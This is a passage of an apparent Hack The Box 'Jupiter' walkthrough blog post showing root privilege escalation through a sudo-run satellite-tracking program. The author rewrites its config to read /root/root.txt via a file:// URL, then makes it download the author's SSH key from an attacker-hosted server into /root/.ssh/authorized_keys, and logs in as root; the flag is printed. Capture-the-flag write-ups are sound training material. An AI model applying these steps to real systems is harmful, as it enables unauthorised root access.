+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">sattrack</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span>
+<span class="p">{</span>
+    <span class="s2">"tleroot"</span><span class="p">:</span> <span class="s2">"/tmp/tle/"</span><span class="p">,</span>
+    <span class="s2">"tlefile"</span><span class="p">:</span> <span class="s2">"weather.txt"</span><span class="p">,</span>
+    <span class="s2">"mapfile"</span><span class="p">:</span> <span class="s2">"/usr/local/share/sattrack/map.json"</span><span class="p">,</span>
+    <span class="s2">"texturefile"</span><span class="p">:</span> <span class="s2">"/usr/local/share/sattrack/earth.png"</span><span class="p">,</span>
+
+    <span class="s2">"tlesources"</span><span class="p">:</span> <span class="p">[</span>
+        <span class="s2">"http://celestrak.org/NORAD/elements/weather.txt"</span><span class="p">,</span>
+        <span class="s2">"http://celestrak.org/NORAD/elements/noaa.txt"</span><span class="p">,</span>
+        <span class="s2">"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&amp;FORMAT=tle"</span>
+    <span class="p">],</span>
+
+    <span class="s2">"updatePerdiod"</span><span class="p">:</span> <span class="mi">1000</span><span class="p">,</span>
+
+    <span class="s2">"station"</span><span class="p">:</span> <span class="p">{</span>
+        <span class="s2">"name"</span><span class="p">:</span> <span class="s2">"LORCA"</span><span class="p">,</span>
+        <span class="s2">"lat"</span><span class="p">:</span> <span class="mf">37.6725</span><span class="p">,</span>
+        <span class="s2">"lon"</span><span class="p">:</span> <span class="o">-</span><span class="mf">1.5863</span><span class="p">,</span>
+        <span class="s2">"hgt"</span><span class="p">:</span> <span class="mf">335.0</span>
+    <span class="p">},</span>
+
+    <span class="s2">"show"</span><span class="p">:</span> <span class="p">[</span>
+    <span class="p">],</span>
+
+    <span class="s2">"columns"</span><span class="p">:</span> <span class="p">[</span>
+        <span class="s2">"name"</span><span class="p">,</span>
+        <span class="s2">"azel"</span><span class="p">,</span>
+        <span class="s2">"dis"</span><span class="p">,</span>
+        <span class="s2">"geo"</span><span class="p">,</span>
+        <span class="s2">"tab"</span><span class="p">,</span>
+        <span class="s2">"pos"</span><span class="p">,</span>
+        <span class="s2">"vel"</span>
+    <span class="p">]</span>
+<span class="p">}</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+At the moment, I'm not familiar with how the program works, so I'll copy the file <code>/usr/local/share/sattrack/config.json</code> to <code>/tmp/config.json</code> since this is the path the program is referencing.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">cp</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">sattrack</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+Now, I'll attempt to run the program once more, this time with the 'config.json' file created.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sattrack</span>
+<span class="n">Satellite</span> <span class="n">Tracking</span> <span class="n">System</span>
+<span class="n">tleroot</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">exist</span><span class="p">,</span> <span class="n">creating</span> <span class="n">it</span><span class="p">:</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="o">/</span>
+<span class="n">Get</span><span class="p">:</span><span class="mi">0</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">celestrak</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">NORAD</span><span class="o">/</span><span class="n">elements</span><span class="o">/</span><span class="n">weather</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">^</span><span class="n">C</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+It appears to be trying to download a file. Based on the output returned, we could deduce that it's using the 'wget' tool.<br/><br/>
+Furthermore, it has created a directory named 'tle' in <code>/tmp</code>. If we list its contents, we find a file called 'weather.txt':<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span>
+<span class="n">total</span> <span class="mi">0</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">14</span><span class="p">:</span><span class="mi">17</span> <span class="n">weather</span><span class="o">.</span><span class="n">txt</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+It seems to be downloading files from the URL addresses we specify in this part of the file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nt">"tlesources"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">"http://celestrak.org/NORAD/elements/weather.txt"</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">"http://celestrak.org/NORAD/elements/noaa.txt"</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&amp;FORMAT=tle"</span>
+<span class="p">],</span>
+</pre></div>
+
+One approach we could try is to, instead of specifying a URL to a web service, point to a system file using the 'file://' wrapper.<br/><br/>
+First, I will modify certain information in the 'config.json' file. I'll change the 'tlefile' field, which refers to the name of the file where the downloaded content will be stored. Next, I'll modify the first URL in the 'tlesources' field to point to a system file using the 'file://' wrapper.<br/><br/>
+Since this file is being executed by root, I will point it to the file '/root/root.txt' in an attempt to access the last flag:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span> 
+<span class="p">{</span>
+    <span class="s2">"tleroot"</span><span class="p">:</span> <span class="s2">"/tmp/tle/"</span><span class="p">,</span>
+    <span class="s2">"tlefile"</span><span class="p">:</span> <span class="s2">"root.txt"</span><span class="p">,</span>
+    <span class="s2">"mapfile"</span><span class="p">:</span> <span class="s2">"/usr/local/share/sattrack/map.json"</span><span class="p">,</span>
+    <span class="s2">"texturefile"</span><span class="p">:</span> <span class="s2">"/usr/local/share/sattrack/earth.png"</span><span class="p">,</span>
+
+    <span class="s2">"tlesources"</span><span class="p">:</span> <span class="p">[</span>
+        <span class="s2">"file:///root/root.txt"</span><span class="p">,</span>
+        <span class="s2">"http://celestrak.org/NORAD/elements/noaa.txt"</span><span class="p">,</span>
+        <span class="s2">"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&amp;FORMAT=tle"</span>
+    <span class="p">],</span>
+
+    <span class="s2">"updatePerdiod"</span><span class="p">:</span> <span class="mi">1000</span><span class="p">,</span>
+
+    <span class="s2">"station"</span><span class="p">:</span> <span class="p">{</span>
+        <span class="s2">"name"</span><span class="p">:</span> <span class="s2">"LORCA"</span><span class="p">,</span>
+        <span class="s2">"lat"</span><span class="p">:</span> <span class="mf">37.6725</span><span class="p">,</span>
+        <span class="s2">"lon"</span><span class="p">:</span> <span class="o">-</span><span class="mf">1.5863</span><span class="p">,</span>
+        <span class="s2">"hgt"</span><span class="p">:</span> <span class="mf">335.0</span>
+    <span class="p">},</span>
+
+    <span class="s2">"show"</span><span class="p">:</span> <span class="p">[</span>
+    <span class="p">],</span>
+
+    <span class="s2">"columns"</span><span class="p">:</span> <span class="p">[</span>
+        <span class="s2">"name"</span><span class="p">,</span>
+        <span class="s2">"azel"</span><span class="p">,</span>
+        <span class="s2">"dis"</span><span class="p">,</span>
+        <span class="s2">"geo"</span><span class="p">,</span>
+        <span class="s2">"tab"</span><span class="p">,</span>
+        <span class="s2">"pos"</span><span class="p">,</span>
+        <span class="s2">"vel"</span>
+    <span class="p">]</span>
+<span class="p">}</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+Once modified, I will run the program as root:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sattrack</span>
+<span class="n">Satellite</span> <span class="n">Tracking</span> <span class="n">System</span>
+<span class="n">Get</span><span class="p">:</span><span class="mi">0</span> <span class="n">file</span><span class="p">:</span><span class="o">///</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">Get</span><span class="p">:</span><span class="mi">1</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">celestrak</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">NORAD</span><span class="o">/</span><span class="n">elements</span><span class="o">/</span><span class="n">noaa</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">^</span><span class="n">C</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+It doesn't appear to have returned any errors; however, I closed it because HTB machines don't have internet access, so they can't download files from the specified URLs.<br/><br/>
+If everything went as planned, we should see the 'root.txt' file in the <code>/tmp/tle</code> directory:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span>
+<span class="n">total</span> <span class="mi">4</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">14</span><span class="p">:</span><span class="mi">25</span> <span class="n">noaa</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">33</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">14</span><span class="p">:</span><span class="mi">25</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">14</span><span class="p">:</span><span class="mi">17</span> <span class="n">weather</span><span class="o">.</span><span class="n">txt</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+It seems that we have successfully read the system-level file, as unlike the other files, the 'root.txt' file has a larger size. Let's proceed to read its content:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="err">$</span> <span class="n">cat</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+<span class="mi">4</span><span class="n">d4ff6fd5ee1c21c6d9b75116cffe223</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="err">$</span>
+</pre></div>
+
+We have successfully read a system-level file and obtained the final flag.<br/><br/>
+To access the system as the 'root' user, I thought about trying to list the contents of the <code>/root/.ssh/id_rsa</code> file. However, this file didn't exist on the victim machine's system.<br/><br/>
+I came up with the idea of downloading my SSH public key and storing it in the <code>/root/.ssh/authorized_keys</code> file. To do this, we need to modify certain information in the 'config.json' file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span>
+<span class="p">{</span>
+    <span class="s2">"tleroot"</span><span class="p">:</span> <span class="s2">"/root/.ssh/"</span><span class="p">,</span>
+    <span class="s2">"tlefile"</span><span class="p">:</span> <span class="s2">"authorized_keys"</span><span class="p">,</span>
+    <span class="s2">"mapfile"</span><span class="p">:</span> <span class="s2">"/usr/local/share/sattrack/map.json"</span><span class="p">,</span>
+    <span class="s2">"texturefile"</span><span class="p">:</span> <span class="s2">"/usr/local/share/sattrack/earth.png"</span><span class="p">,</span>
+
+    <span class="s2">"tlesources"</span><span class="p">:</span> <span class="p">[</span>
+        <span class="s2">"http://10.10.16.3/authorized_keys"</span><span class="p">,</span>
+        <span class="s2">"http://celestrak.org/NORAD/elements/noaa.txt"</span><span class="p">,</span>
+        <span class="s2">"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&amp;FORMAT=tle"</span>
+    <span class="p">],</span>
+
+    <span class="s2">"updatePerdiod"</span><span class="p">:</span> <span class="mi">1000</span><span class="p">,</span>
+
+    <span class="s2">"station"</span><span class="p">:</span> <span class="p">{</span>
+        <span class="s2">"name"</span><span class="p">:</span> <span class="s2">"LORCA"</span><span class="p">,</span>
+        <span class="s2">"lat"</span><span class="p">:</span> <span class="mf">37.6725</span><span class="p">,</span>
+        <span class="s2">"lon"</span><span class="p">:</span> <span class="o">-</span><span class="mf">1.5863</span><span class="p">,</span>
+        <span class="s2">"hgt"</span><span class="p">:</span> <span class="mf">335.0</span>
+    <span class="p">},</span>
+
+    <span class="s2">"show"</span><span class="p">:</span> <span class="p">[</span>
+    <span class="p">],</span>
+
+    <span class="s2">"columns"</span><span class="p">:</span> <span class="p">[</span>
+        <span class="s2">"name"</span><span class="p">,</span>
+        <span class="s2">"azel"</span><span class="p">,</span>
+        <span class="s2">"dis"</span><span class="p">,</span>
+        <span class="s2">"geo"</span><span class="p">,</span>
+        <span class="s2">"tab"</span><span class="p">,</span>
+        <span class="s2">"pos"</span><span class="p">,</span>
+        <span class="s2">"vel"</span>
+    <span class="p">]</span>
+<span class="p">}</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="err">$</span>
+</pre></div>
+
+In essence, I modified the values of the fields 'tleroot,' 'tlefile,' and 'tlesources.'<br/><br/>
+The 'tleroot' field's value is the directory where I want to store the downloaded content. The 'tlefile' field's value is the name of the file where I want to store the downloaded content. Finally, the 'tlesources' field contains the URLs from which I want to download the file's content.<br/><br/>
+In this case, 'tleroot' will point to the <code>/root/.ssh</code> directory, the name of the file that will be created with the downloaded content will be 'authorized_keys,' and the content will be downloaded from my attacker machine. Thus, I will need to host an HTTP server to serve the 'authorized_keys' file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cp</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="o">.</span><span class="n">pub</span> <span class="n">authorized_keys</span>
+<span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sattrack</span>
+<span class="n">Satellite</span> <span class="n">Tracking</span> <span class="n">System</span>
+<span class="n">Get</span><span class="p">:</span><span class="mi">0</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.16.3</span><span class="o">/</span><span class="n">authorized_keys</span>
+<span class="n">Get</span><span class="p">:</span><span class="mi">1</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">celestrak</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">NORAD</span><span class="o">/</span><span class="n">elements</span><span class="o">/</span><span class="n">noaa</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">^</span><span class="n">C</span>
+</pre></div>
+
+We receive the GET request from the victim machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.11.216</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">22</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="s2">"GET /authorized_keys HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
+</pre></div>
+
+If everything has worked correctly, we should now be able to access the victim machine as the 'root' user via SSH without needing to provide credentials:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">root</span><span class="o">@</span><span class="mf">10.10.11.216</span>
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">72</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+
+ <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="o">.</span><span class="n">canonical</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">advantage</span>
+
+  <span class="n">System</span> <span class="n">information</span> <span class="k">as</span> <span class="n">of</span> <span class="n">Sun</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">02</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">50</span> <span class="n">PM</span> <span class="n">UTC</span> <span class="mi">2023</span>
+
+  <span class="n">System</span> <span class="n">load</span><span class="p">:</span>           <span class="mf">0.0</span>
+  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>            <span class="mf">81.3</span><span class="o">%</span> <span class="n">of</span> <span class="mf">12.33</span><span class="n">GB</span>
+  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span>          <span class="mi">26</span><span class="o">%</span>
+  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>            <span class="mi">0</span><span class="o">%</span>
+  <span class="n">Processes</span><span class="p">:</span>             <span class="mi">243</span>
+  <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>       <span class="mi">0</span>
+  <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.10.11.216</span>
+  <span class="n">IPv6</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">250</span><span class="p">:</span><span class="mi">56</span><span class="n">ff</span><span class="p">:</span><span class="n">feb9</span><span class="p">:</span><span class="n">af90</span>
+
+
+<span class="n">Expanded</span> <span class="n">Security</span> <span class="n">Maintenance</span> <span class="k">for</span> <span class="n">Applications</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">enabled</span><span class="o">.</span>
+
+<span class="mi">0</span> <span class="n">updates</span> <span class="n">can</span> <span class="n">be</span> <span class="n">applied</span> <span class="n">immediately</span><span class="o">.</span>
+
+<span class="n">Enable</span> <span class="n">ESM</span> <span class="n">Apps</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">additional</span> <span class="n">future</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
+<span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">esm</span> <span class="ow">or</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">pro</span> <span class="n">status</span>
+
+
+<span class="n">The</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
+<span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
+<span class="n">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">changelogs</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">meta</span><span class="o">-</span><span class="n">release</span><span class="o">-</span><span class="n">lts</span><span class="o">.</span> <span class="n">Check</span> <span class="n">your</span> <span class="n">Internet</span> <span class="n">connection</span> <span class="ow">or</span> <span class="n">proxy</span> <span class="n">settings</span>
+
+
+<span class="nd">@root@jupiter</span><span class="p">:</span><span class="o">~</span><span class="c1">#</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="o">@</span><span class="n">root</span><span class="o">@</span><span class="n">jupiter</span><span class="p">:</span><span class="o">~#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">4</span><span class="n">d4ff6fd5ee1c21c6d9b75116cffe223</span>
+<span class="o">@</span><span class="n">root</span><span class="o">@</span><span class="n">jupiter</span><span class="p">:</span><span class="o">~#</span>
+</pre></div></br></br></br></br></br></br></br></br></br></br>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2023 elswix.github.io</p>
+    </footer>
+</body>
+</html>
